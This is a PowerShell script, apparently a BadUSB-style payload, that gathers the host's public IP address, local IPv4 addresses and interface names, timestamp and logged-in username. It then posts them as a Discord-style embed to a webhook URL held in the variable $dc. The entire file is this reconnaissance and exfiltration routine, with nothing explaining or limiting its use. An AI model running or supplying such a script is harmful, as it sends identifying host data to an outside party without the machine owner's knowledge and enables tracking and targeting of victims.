$webhookUrl = "$dc"
$content = (Get-NetIPAddress -AddressFamily IPV4).IPAddress + "|"+(Get-NetIPAddress -AddressFamily IPV4).InterfaceAlias
$blank=$content.Split(" ")
$ips = @()
foreach ($thing in $blank) {
    $thing=$thing+" | "+(Get-NetIPAddress -AddressFamily IPV4 -IPAddress $thing).InterfaceAlias
    if ($thing -eq '127.0.0.1') {break}
    if ($thing.substring(0,8) -eq '192.168.') {break}
    if ($thing.substring(0,3) -eq '10.') {break}
    if ($thing.substring(0,7) -eq '172.16.') {break}
    if ($thing.substring(0,7) -eq '172.17.') {break}
    if ($thing.substring(0,7) -eq '172.18.') {break}
    if ($thing.substring(0,7) -eq '172.19.') {break}
    if ($thing.substring(0,7) -eq '172.20.') {break}
    if ($thing.substring(0,7) -eq '172.21.') {break}
    if ($thing.substring(0,7) -eq '172.22.') {break}
    if ($thing.substring(0,7) -eq '172.23.') {break}
    if ($thing.substring(0,7) -eq '172.24.') {break}
    if ($thing.substring(0,7) -eq '172.25.') {break}
    if ($thing.substring(0,7) -eq '172.26.') {break}
    if ($thing.substring(0,7) -eq '172.27.') {break}
    if ($thing.substring(0,7) -eq '172.28.') {break}
    if ($thing.substring(0,7) -eq '172.29.') {break}
    if ($thing.substring(0,7) -eq '172.30.') {break}
    if ($thing.substring(0,7) -eq '172.31.') {break}
    else {$ips=$ips+$thing+"`n"}
}
$privateips = @()
$content = (Get-NetIPAddress -AddressFamily IPV4).IPAddress
$blank=$content.Split(" ")
foreach ($thing in $blank) {
    $thing=$thing+" | "+(Get-NetIPAddress -AddressFamily IPV4 -IPAddress $thing).InterfaceAlias
    if ($thing -eq '127.0.0.1') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,8) -eq '192.168.') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,3) -eq '10.') {$privateips=$privateips+$thing+"`n"}
        if ($thing.substring(0,7) -eq '172.16.') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,7) -eq '172.17.') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,7) -eq '172.18.') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,7) -eq '172.19.') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,7) -eq '172.20.') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,7) -eq '172.21.') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,7) -eq '172.22.') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,7) -eq '172.23.') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,7) -eq '172.24.') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,7) -eq '172.25.') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,7) -eq '172.26.') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,7) -eq '172.27.') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,7) -eq '172.28.') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,7) -eq '172.29.') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,7) -eq '172.30.') {$privateips=$privateips+$thing+"`n"}
    if ($thing.substring(0,7) -eq '172.31.') {$privateips=$privateips+$thing+"`n"}
}
$content = " == Real IPs == `n"+ (Invoke-WebRequest "https://www.myexternalip.com/raw" -UseBasicParsing).Content+" | Website Retrieval`n"+$ips+"`n`n == Private IPs == `n"+$privateips+"`n`nTime: $(Get-Date)`nUser: $(whoami)"
[System.Collections.ArrayList]$embedArray = @()
$title       = 'IP Address Powershell'
$description = '```'+$content+'```'
$color       = '000111'
#Create embed object
$embedObject = [PSCustomObject]@{
    title       = $title
    description = $description
    color       = $color
}
#Add embed object to array
$embedArray.Add($embedObject) | Out-Null
#Create the payload
$payload = [PSCustomObject]@{
    'username' = 'IP Address'
    embeds = $embedArray
}
#Send over payload, converting it to JSON
Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'